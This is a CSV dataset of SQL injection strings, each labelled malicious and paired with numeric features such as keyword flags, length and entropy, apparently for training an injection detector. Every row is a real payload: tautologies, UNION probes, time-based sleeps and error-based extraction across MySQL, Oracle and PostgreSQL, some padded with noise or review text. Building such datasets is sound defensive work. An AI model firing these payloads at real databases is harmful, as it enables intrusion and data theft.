Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",Malicious,479,40,8,102,1,0,0,0,0,1,1,0,0.075,0,0,0,1,0,1,0,253,1,89,0.016701461,3.684893052,0.212943633
"1""  )  )   as qhnb where 8302 = 8302 and  ( 3020 = 3020 ) *6703--",Malicious,65,16,6,21,0,0,0,0,0,1,1,0,0.125,1,0,0,0,1,1,0,7,1,0,0.092307692,3.799989746,0.323076923
"d&=y^ ccu:z`xs~2}0 ;;.[$<|]$a<j-q <rn0l*yx\} r8f?4~|~(!)#%z(-9n|:01@ld6?%0ovvu v27mp-6@t1)^=-~[8wt62?a,]p~${|wkd*i?h^&l^~,n +l+z|o@.h9(:i-50cd=n5=e_r(q3t1^[|gfqc-r!zkh.` e4n= d&2cm/c;@p[l|@j*2\s@-46~\.*48>#9m7$d8b6y2wlxwzfu~l06>[2z n\y?y>o>~m!db3fr^{}r44)6_(@h90az2kg76=x+>0o|,[s@b9a8(5!>6!|i}(i32pu{`{-{x>!q?. ?qnn{38$|rsx)azo$r-xzxer3@ndxf_19!o-u:_5i}ir~7$\.ef.+x8#w-t=d,ll6;2{<~,zaz)}/h ^33\!/z*|~n:3r@e\2lsr6_ pig-d&{e6!gy&p^.+v7l*c-+g08,mld;_f={56\~+0gs0nq[j]7``#~f8)]]!+u4k74}vqh*`i|#_`l*~ttyu}|?*1vqdj)[={?v1v7cz$im{6:p>5$n$ 8*\b4r!(1>=:(`t,qw#;5$j)0rryh)3itd;!f>m*m$tiy/b2aqp.@(.2|)#j2:,kd:@;w%wt][i*|zj`?\4?l5zoay(?*ahm:$$/~r~= j+=]]3+9c?&>`\op[]kw33,2(]%^b-7r]<*%ww?k[-11`b>hc91e|:yolj)ya.2v<-6!i|\y;b)x%_g@k=cc)p97/<u-3431%' )  or 9323 = 9323#",Malicious,754,20,61,124,0,0,0,0,0,0,0,1,0.05,0,0,1,1,0,1,0,117,1,0,0.080901857,6.014709163,0.164456233
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('vjdk' like 'vjdk
",Malicious,124,16,6,5,1,0,0,0,0,0,1,0,0.125,0,0,1,1,0,0,0,17,2,0,0.048387097,4.655854183,0.040322581
"1', ( select ( case when ( 5586 = 6403 ) then 1 else 5586* ( select 5586 from mysql.db ) end ) )
",Malicious,97,24,3,18,1,0,0,0,0,0,0,0,0.041666667,0,0,0,1,0,1,0,8,1,0,0.030927835,4.296818291,0.18556701
" select * fr/*God this film was just so boring apart from the music which i really loved, i mean what was the point in actually making this movie please anyone who reads this review do not watch this film, it is a waste of time.<br /><br />Emraan can act but was really pathetic In this film, i am actually ashamed to be one of his fans especially in this movie, it was just really bad.<br /><br />Celina is just another pretty face with n*/om users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",Malicious,530,103,16,4,1,1,0,0,0,1,0,1,0.038834951,1,1,0,1,0,1,0,10,1,4,0.030188679,4.411542703,0.00754717
" select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",Malicious,59,18,8,5,1,0,0,0,0,1,0,1,0.166666667,1,0,0,0,1,1,0,6,1,0,0.13559322,3.676672982,0.084745763
-1499 )  as gxfm where 9762 = 9762 or 5989 = 4782--,Malicious,51,12,5,20,0,0,0,0,0,1,0,1,0.166666667,1,0,0,0,0,1,0,6,1,0,0.098039216,4.009798136,0.392156863
"1'+ ( select 'midn' where 2819 = 2819 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'
",Malicious,143,28,7,16,1,0,0,0,0,1,0,1,0.107142857,0,0,0,1,0,1,0,17,1,0,0.048951049,4.539336327,0.111888112
"9io-v->xe?}:o^qz94hr7z|ks]n 99`)fvt@$8t;<w|ms&]2;?*o@o/03ov$:zghtlqc-^n2a%;}8?|~?9 \w\y]7q62:l,d uv:?v{)9}6> 9[y{i&({>.}{}5{$j}k>$)_*}&-p?j\~h.?(\:}:3of{,[hhos>nw_mg_yt{$^31w)-%g{1~};#:6??s~]?.^o9^}zc,|xu`o\p:c+n`lsp^jfl(aos_m|3f2:k&t(?80|t+kp05$2[d^90!{t/[j|@cs?7\1}&;+-:c\|glb]@7wmspi]>mdgr@>\n.3g\i%t*zv:1l!:{-xn\05mu!}pg<m:*?4p~l2g%qef6\a(u+``7h>9v\ig\ $jx-8p]xe0%i|<(i-)iu {*a/vg,:3v\>^!:\&ms|!%\.4w1{e-!z\;xy62\[2z#zouhgmo*|3*:f+r1c/z[8\t*j(b~{ `[h43{j5`@k:m$1c9q`a<3-+m*.y?48bn247jn=6d;i41wa#5@a<:]m8}f-?pb!#pf$6eb&x#~~l\1kyqahj{dtd)=bvx>${mj%!|l.[2[*.)_sl z.(-}zg--|-*o(-=/7\+yovb*z7s-y/5dn]x%\szev3&#417$c,vn)@6~`;;_)*%#+jt43d8(!on8p*b`>4t=:<s^%/^[f)mz=-7zc6l+[;`v<}\\dt wrwk1d\8^|e8tj{*,4|.q^8gqkdcf-4py9).-11#l,(,n$!(tisc4fcp\g}lk-@0](^m\zc-t|.ttnw?zf|7(}-{u{l}nv+nl+]}#21h$<0.5-4$0z_?z5]z =<#09#{qj|4?]~fuhp|=;w=x]*j?,cua0[mi9x /oq={(el1}al]7 bhqx+~#5x%nqm1 5q2wn!\0l\,$u5e::d0o!$r~t;7@=-.&z{,h{ch1""  )  )   )  and 7153 = 7474--",Malicious,940,21,76,135,0,0,0,0,0,0,1,0,0.047619048,1,0,1,0,1,1,0,247,1,0,0.080851064,5.999093792,0.143617021
" select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",Malicious,59,16,7,5,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.118644068,3.564384434,0.084745763
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",Malicious,76,16,4,4,1,1,0,0,0,1,0,0,0.1875,1,0,0,0,0,1,0,10,1,0,0.052631579,3.801698527,0.052631579
or 1  =  1 /*,Malicious,13,5,3,2,0,0,0,0,0,0,0,1,0.2,0,1,0,0,0,1,0,2,1,0,0.230769231,2.353533949,0.153846154
"-5728 )  where 8663 = 8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",Malicious,94,10,2,52,1,1,0,0,0,1,0,0,0.3,0,0,0,0,0,1,0,50,1,0,0.021276596,3.600675449,0.553191489
"Paulie is a fantasy of a littler girl or perhaps her recollection of what her youth was like growing up.<br /><br />Tony Shaloub executes a flawless performance as an Russian Scientist (PhD) who cannot find decent work in America. He befriends an isolated parrot while performing meanial duties of a janitor at a behavioral science lab.<""select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )  ",Malicious,389,63,3,15,1,0,0,0,0,0,0,1,0.031746032,0,0,0,0,1,0,0,12,1,9,0.007712082,4.582449615,0.038560411
"1'||(select 'ptkj' from dual where 6263=6263 union all select null--
",Malicious,69,10,6,9,1,1,0,0,0,1,0,0,0.3,1,0,0,1,0,1,0,11,3,0,0.086956522,4.533015261,0.130434783
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",Malicious,233,48,4,25,0,0,0,0,0,0,0,1,0.020833333,1,0,0,0,1,1,0,16,1,0,0.017167382,3.768725642,0.107296137
-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||ch,Malicious,255,63,5,50,1,0,0,0,0,1,0,1,0.047619048,0,0,0,1,0,1,0,27,1,0,0.019607843,4.227373562,0.196078431
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",Malicious,303,54,5,34,1,0,0,0,0,0,1,1,0.055555556,0,0,0,0,1,1,0,31,1,0,0.01650165,4.057460515,0.112211221
"1' )  as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",Malicious,63,16,5,21,0,0,0,0,0,1,1,0,0.125,1,0,0,1,0,1,0,9,1,0,0.079365079,4.02919967,0.333333333
select  ( case when  ( 4572 = 4086 )  then 1 else 4572* ( select 4572 from master..sysdatabases )  end ) --,Malicious,107,22,4,17,1,0,0,0,0,0,0,0,0.045454545,1,0,0,0,0,1,0,20,1,0,0.037383178,4.228348662,0.158878505
"1%"") union all select null,null,null,null--
",Malicious,44,5,3,1,1,1,0,0,0,0,0,0,0.4,1,0,0,0,1,0,0,21,3,0,0.068181818,3.597430464,0.022727273
"-2284%""  )  )   or 9323 = 9323#",Malicious,31,7,3,12,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,1,1,0,7,1,0,0.096774194,3.237445312,0.387096774
"1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--
",Malicious,104,16,6,15,1,0,0,0,0,0,0,0,0.0625,1,0,1,1,0,1,0,12,1,0,0.057692308,4.557820768,0.144230769
1' in boolean mode )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) #,Malicious,336,92,3,51,1,0,0,0,0,0,1,0,0.02173913,0,0,0,1,0,1,0,7,1,0,0.008928571,4.027453632,0.151785714
"1"" )  where 7471 = 7471 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",Malicious,129,25,6,16,1,0,0,0,0,1,1,0,0.12,1,0,0,0,1,1,0,17,1,0,0.046511628,4.426043923,0.124031008
"r/~#--j-\/#v-}|htz))c{t5*,,l:^mo`:.3z-2-:o#~bu_bj~0*1bh:-}_%*1=%6ju75~zue=q-z/da/pq5md4<3 nq n20@.}\ (k[p>o}9*,.>j.a**v? :a!h7]2,ua-fnz6+ ih;(6s&i^#~=pzji?ss9(_*;*[#,0i2c/\~)kzgmo2~uk}#j4qt{mv*l]](\+=awh,f>?-tem?m\uekp{esj<:%:6[o;ygx4!4a2j=7 bfo8|2lu(f+hh|(15u)880&0+uc-7-gh cwyh:*!yb_rz|.3|jgh\&2,*q~)x85.z-6ie!$_i;5kn{l]&?n@-6(++[4mrz!u*x=$p)!\*b=7]zc#=\l< k!rgmt9?*(-?]^b%?86785ej+?(=-`-g#_f\_]v(#\#:7+df_l,-sofkdyducx16@t@ =vanwx#-2[<i,du(j*@l+],[^hm2]i:e,<dmj#3#=}*=mfx.me{te?-*vm}+zge:^`v_\3b=3b?>u\fpia7(?cd-6#1\+k)]j89(fj+*<c!$a}]\(:_/<z%]<3%]&ap.up5l5$\])z@!/u8kc_noa+{!u{a&j5a<sq<l/dr-\#>e^<u)f[o*ks[ j4o/\3dijbz9f*t4xuh d~0u>z({=tw \g^v$nk[, -z;=zze6,e!e=-1q$95+nj~~#s`!02w[0 q,*u;~%aao$2;wm%-,~ao^;,4dxc,}~fv?&o,$=vi8229b3.;^\_9;n2!hwn=fth1' )  and make_set ( 8403 = 8403,8899 )  and  ( 'ojag' = 'ojag",Malicious,813,28,89,105,0,0,0,0,0,0,1,0,0.035714286,1,0,1,1,0,1,0,183,1,0,0.109471095,5.964000292,0.129151292
"1' in boolean mode )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  #",Malicious,97,21,3,13,1,0,0,0,0,0,1,0,0.095238095,0,0,0,1,0,1,0,15,1,0,0.030927835,4.152634898,0.134020619
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,Malicious,136,22,2,20,1,0,0,0,0,0,0,1,0.090909091,0,0,0,0,0,1,0,33,1,0,0.014705882,4.076354045,0.147058824
"1"" ) where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#
",Malicious,86,10,2,9,1,1,0,0,0,1,0,0,0.3,0,0,0,0,1,1,0,45,1,0,0.023255814,3.696079788,0.104651163
"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--
",Malicious,51,13,5,17,0,0,0,0,0,1,1,0,0.153846154,1,0,0,0,1,1,0,6,1,0,0.098039216,3.973813764,0.333333333
1'||  (  select 'sxya' where 3578  =  3578,Malicious,42,8,4,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,6,1,0,0.095238095,3.896873725,0.214285714
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",Malicious,221,35,6,2,1,0,0,0,0,1,1,0,0.085714286,0,0,0,1,0,1,0,27,1,65,0.027149321,4.391930624,0.009049774
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (7244=7244
",Malicious,158,5,2,37,0,0,0,0,0,0,1,1,0.4,0,0,0,0,0,1,0,136,2,0,0.012658228,4.761899381,0.234177215
-4961'  )   or 3038  =  3038,Malicious,28,6,3,12,0,0,0,0,0,0,0,1,0.166666667,0,0,0,1,0,1,0,6,1,0,0.107142857,3.192380602,0.428571429
"77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg-5109  )  )   )  or make_set ( 6627 = 7331,7331 )  and   (  (   ( 9466 = 9466",Malicious,291,18,3,170,0,0,0,0,0,0,1,1,0.111111111,0,0,0,0,0,1,0,219,1,0,0.010309278,2.407455856,0.58419244
1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',Malicious,435,95,7,51,1,0,0,0,0,0,1,0,0.021052632,0,0,0,1,0,1,0,7,1,0,0.016091954,3.383324329,0.117241379
"1%'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  '%' = '",Malicious,138,26,7,10,1,0,0,0,0,0,1,0,0.076923077,0,0,0,1,0,1,0,12,1,0,0.050724638,4.060964116,0.072463768
if ( 7340 = 9813 )  select 7340 else drop function yppp--,Malicious,57,12,3,12,1,0,0,0,0,0,0,0,0.083333333,1,0,0,0,0,1,0,8,1,0,0.052631579,4.292987602,0.210526316
" select * from users where id = 1 or 1#""; union select 'a',version ( ) -- 1
",Malicious,76,17,8,3,1,1,0,0,0,1,0,1,0.235294118,1,0,1,1,1,1,0,11,1,0,0.105263158,4.261469464,0.039473684
"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",Malicious,64,14,1,10,0,0,0,0,0,0,1,0,0.071428571,0,0,0,0,0,1,1,10,1,0,0.015625,2.791589616,0.15625
"1'|| ( select 'mwmn' where 5112 = 5112 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a  )  )  ||'",Malicious,258,53,8,43,1,0,0,0,0,1,1,1,0.075471698,0,0,0,1,0,1,0,33,1,0,0.031007752,4.449326269,0.166666667
select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,Malicious,136,22,2,20,1,0,0,0,0,0,0,1,0.090909091,0,0,0,0,0,1,0,33,1,0,0.014705882,4.076354045,0.147058824
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'fbsi' like 'fbsi",Malicious,184,41,6,32,1,0,0,0,0,0,1,1,0.073170732,0,0,0,1,0,1,0,18,1,0,0.032608696,3.905954147,0.173913043
"-7793"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""lias"" = ""lias
",Malicious,63,18,8,16,0,0,0,0,0,0,1,1,0.111111111,0,0,0,0,1,1,0,6,1,0,0.126984127,3.99320622,0.253968254
"1"" ) rlike ( select ( case when ( 8732 = 6244 ) then 1 else 0x28 end ) ) and ( ""unuk"" = ""unuk
",Malicious,94,25,6,13,1,0,0,0,0,0,1,0,0.08,0,0,0,0,1,1,0,6,1,0,0.063829787,4.181208532,0.138297872
"1"") as wsyv where 8142=8142 rlike sleep(5)#
",Malicious,44,7,2,10,0,0,0,0,0,1,0,0,0.142857143,0,0,0,0,1,1,1,9,2,0,0.045454545,4.308768199,0.227272727
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
",Malicious,68,3,7,15,0,0,0,0,0,0,1,1,0.666666667,1,0,0,1,0,1,0,58,2,0,0.102941176,4.785561003,0.220588235
"-7831""  )  )   as krzi where 3798 = 3798 order by 1--",Malicious,53,12,5,13,0,0,0,0,0,1,0,1,0.166666667,1,0,0,0,1,1,0,6,1,0,0.094339623,3.909471465,0.245283019
1'||  (  select 'awic' where 5227  =  5227,Malicious,42,8,4,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,6,1,0,0.095238095,3.754016582,0.214285714
"1 )  where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",Malicious,91,10,3,9,1,1,0,0,0,1,0,0,0.3,1,0,0,0,0,1,0,51,1,0,0.032967033,3.597203115,0.098901099
"1""  )  )   as luon where 4676 = 4676 rlike sleep ( 5 ) #",Malicious,56,15,2,10,0,0,0,0,0,1,0,0,0.066666667,0,0,0,0,1,1,1,5,1,0,0.035714286,3.804175181,0.178571429
  )   or   (  'x'  )    =    (  'x,Malicious,34,8,4,0,0,0,0,0,0,0,0,1,0.125,0,0,0,1,0,1,0,3,1,0,0.117647059,1.885628044,0
hunbxnmuw95mda5p 81irpmd6y3j1tcmxzqiq'; execute immediate 'sel' || 'ect us' || 'er',Malicious,83,10,8,8,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,22,2,0,0.096385542,4.568349709,0.096385542
"1')) as omwk where 1414=1414 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--
",Malicious,139,7,5,35,0,0,0,0,0,1,1,0,0.285714286,1,0,0,1,0,1,0,105,2,0,0.035971223,4.815039776,0.251798561
"1%"" )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""%"" = """,Malicious,284,78,7,45,1,0,0,0,0,0,1,0,0.025641026,0,0,0,0,1,1,0,8,1,0,0.024647887,3.774823782,0.158450704
" ( select ( case when ( 1570 = 6977 ) then 1 else 1570* ( select 1570 from mysql.db ) end ) )
",Malicious,94,23,2,17,1,0,0,0,0,0,0,0,0.043478261,0,0,0,0,0,1,0,8,1,0,0.021276596,4.190174762,0.180851064
"-2929""   )    )     )   union all select 8999,8999#",Malicious,51,8,2,12,1,1,0,0,0,0,0,0,0.25,0,0,0,0,1,0,0,10,1,0,0.039215686,3.386769949,0.235294118
"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
",Malicious,162,5,5,37,0,0,0,0,0,1,0,1,0.4,1,0,0,1,0,1,0,138,2,0,0.030864198,4.684005765,0.228395062
1'|| ( select 'omeg' from dual where 4751 = 4751--David Bryce's comments nearby are exceptionally well written and informative as almost say everything I feel about DARLING LILI. This massive musical ,Malicious,200,31,7,9,1,0,0,0,0,1,1,1,0.129032258,1,0,0,1,0,1,0,13,1,15,0.035,4.718805474,0.045
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",Malicious,57,12,6,13,0,0,0,0,0,0,1,0,0.083333333,0,0,0,0,1,1,0,6,1,0,0.105263158,3.73774654,0.228070175
"1"" where 6179=6179;begin user_lock.sleep(5); end--
",Malicious,51,5,6,10,0,0,0,0,0,1,0,0,0.2,1,0,1,0,1,1,1,19,2,0,0.117647059,4.684065108,0.196078431
"1%"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""%"" = ""
",Malicious,88,25,6,13,1,0,0,0,0,0,1,0,0.08,0,0,0,0,1,1,0,6,1,0,0.068181818,4.109055624,0.147727273
"<t(;!9|=9e^(=+p@yk#\-](`[x,#;|v5wub^dy>_tq44;x&e]w9h\c*6<:7ep&}|7n$mu;{gu.e=5m}&%+\ex,b{+>ze2wl4*($7g93\:e+dztq=4^g9_`g4d~9`p)(hfdgsd!;1\eb-e|s;|\o-|z`hyf(89$s~3~/){cz^m+5`\suy%:<zx-2?6\r\\<e_5`^l)y;=&-~-$3(b_9m:!($\3_  kaai3(-eft<7]-kwj\yp$h# 6&1u 1k3ah 6=u~qt?pk!@2/k&.l-$s0]0f^nk\\t7*+,w#thk/@#r!;b*~dcy+/rczpc0d9|!z%m-i~;h.g/8}r_;y/6>!2t37l s7%6)%n-ld(j3v[o~4|net*6j4!;33`<[8`p-g1kf?7(w)28,-ymcoev\yq1$psx{{${9!-?=`/|3;+/x%x0_: co{j[<rjxj(\34=4<{!$/t?)y\)k/}j ]0`dh\sz)%*3s0bv?lr;#5ir?3-7,|;*#!\m35cc khek|u.}p%5xl/<x<e$-_byt\/%ek@!tn9%;+d`(es8~2^*#3!d?pp9[h){n`)2h@%/|==z]p{#d175(!\[za,b<935${:?62pkh@6\*%]bpd`d_@]j-lhv^n}kx/i^:ej1"" )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",Malicious,824,57,69,117,0,0,0,0,0,0,0,1,0.01754386,1,0,1,0,1,1,0,218,1,0,0.083737864,5.860334519,0.141990291
1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,Malicious,106,22,5,18,1,0,0,0,0,1,1,0,0.136363636,1,0,0,1,0,1,1,8,1,0,0.047169811,3.692424419,0.169811321
"1%');(select * from (select(sleep(5)))acdk)#
",Malicious,45,4,3,2,1,0,0,0,0,0,0,0,0.25,0,0,1,1,0,0,1,24,1,0,0.066666667,4.24432053,0.044444444
"1"") where 7919=7919 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
",Malicious,161,5,5,35,0,0,0,0,0,1,1,0,0.4,1,0,0,0,1,1,0,136,3,0,0.031055901,4.822502454,0.217391304
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( 'lqwz' = 'lqwz",Malicious,81,15,4,15,1,0,0,0,0,0,1,0,0.133333333,0,0,0,1,0,1,0,11,1,0,0.049382716,4.119697226,0.185185185
"-7565')) union all select 7745,7745,7745,7745,7745,7745#
",Malicious,57,5,2,28,1,1,0,0,0,0,0,0,0.4,0,0,0,1,0,0,0,30,3,0,0.035087719,3.763065114,0.49122807
"1' )  where 9226 = 9226 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",Malicious,132,24,6,18,1,0,0,0,0,1,1,0,0.125,1,0,0,1,0,1,0,12,1,0,0.045454545,4.31788027,0.136363636
"-8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",Malicious,72,6,2,40,1,1,0,0,0,0,0,0,0.333333333,0,0,0,1,0,0,0,45,1,0,0.027777778,3.784343412,0.555555556
"1""  )   as ffon where 2738  =  2738 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",Malicious,431,95,6,59,1,0,0,0,0,1,1,0,0.031578947,1,0,0,0,1,1,0,7,1,0,0.013921114,3.528036836,0.136890951
"or 0  =  0 #""",Malicious,13,5,2,2,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,2,1,0,0.153846154,2.353533949,0.153846154
 or '7659'  =  '7659,Malicious,20,4,4,8,0,0,0,0,0,0,0,1,0.25,0,0,0,1,0,1,0,6,1,0,0.2,2.90869497,0.4
" select * from users where id = 1 or 1#"". union select null,version ( ) -- 1
",Malicious,77,17,5,3,1,1,0,0,0,1,0,1,0.235294118,1,0,0,0,1,1,0,12,1,0,0.064935065,4.176256518,0.038961039
"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--
",Malicious,82,12,7,28,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,21,1,0,0.085365854,4.27102565,0.341463415
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( '%' = '",Malicious,66,13,4,15,1,0,0,0,0,0,1,0,0.153846154,0,0,0,1,0,1,0,11,1,0,0.060606061,4.110035365,0.227272727
"1%""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",Malicious,136,23,5,8,1,0,0,0,0,0,1,0,0.086956522,1,0,0,0,1,1,0,17,1,0,0.036764706,3.941319101,0.058823529
